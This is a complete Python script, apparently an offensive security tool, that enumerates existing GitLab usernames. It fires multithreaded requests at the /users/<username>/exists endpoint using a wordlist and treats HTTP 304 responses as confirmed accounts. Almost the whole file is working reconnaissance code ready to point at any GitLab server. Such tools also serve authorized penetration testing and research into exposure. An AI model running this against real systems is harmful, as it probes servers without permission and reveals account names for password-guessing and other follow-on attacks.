#!/usr/bin/env python3

import requests
import argparse
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

def check_username(session, url, username, headers):
    try:
        full_url = f"{url.rstrip('/')}/users/{username}/exists"
        r = session.get(full_url, headers=headers, timeout=10)

        if r.status_code == 200:
            json_data = r.json()
            if json_data.get("exists") is True:
                return (username, True, None)
            else:
                return (username, False, None)
        elif r.status_code == 304:
            # User exists; GitLab caching mechanism
            return (username, True, None)
        else:
            return (username, False, f"Unexpected HTTP {r.status_code}")

    except requests.RequestException as e:
        return (username, False, f"Request failed: {e}")

def main():
    parser = argparse.ArgumentParser(description='GitLab User Enumeration via /users/<username>/exists')
    parser.add_argument('--url', '-u', type=str, required=True, help='Base URL of GitLab (e.g., http://gitlab.local/)')
    parser.add_argument('--wordlist', '-w', type=str, required=True, help='Username wordlist file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Number of threads (default: 10)')
    args = parser.parse_args()

    print('[*] Starting GitLab user enumeration (handles 304 responses)')

    try:
        usernames_file = open(args.wordlist, 'r', encoding='utf-8', errors='ignore')
    except Exception as e:
        print(f'[!] Failed to open wordlist: {e}')
        return

    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache"  # Optional: try to reduce caching
    }

    executor = ThreadPoolExecutor(max_workers=args.threads)
    futures = []
    total_submitted = 0

    progress = tqdm(desc="Enumerating", ncols=80)

    try:
        for line in usernames_file:
            username = line.strip()
            if not username:
                continue

            future = executor.submit(check_username, session, args.url, username, headers)
            futures.append(future)
            total_submitted += 1

            # Update description with count
            progress.set_description(f"Enumerating ({total_submitted} submitted)")

            # Process in small batches to avoid large memory
            if len(futures) >= args.threads * 5:
                for completed_future in as_completed(futures):
                    uname, exists, error = completed_future.result()
                    progress.update(1)

                    if error:
                        tqdm.write(f'[!] {uname}: {error}')
                    elif exists:
                        tqdm.write(f'[+] User found: {uname}')
                    else:
                        if args.verbose:
                            tqdm.write(f'[-] User not found: {uname}')
                    futures.remove(completed_future)
                    break  # Process one at a time

        # Process remaining futures
        for remaining_future in as_completed(futures):
            uname, exists, error = remaining_future.result()
            progress.update(1)

            if error:
                tqdm.write(f'[!] {uname}: {error}')
            elif exists:
                tqdm.write(f'[+] User found: {uname}')
            else:
                if args.verbose:
                    tqdm.write(f'[-] User not found: {uname}')

    finally:
        usernames_file.close()
        executor.shutdown(wait=True)
        progress.close()

if __name__ == '__main__':
    main()
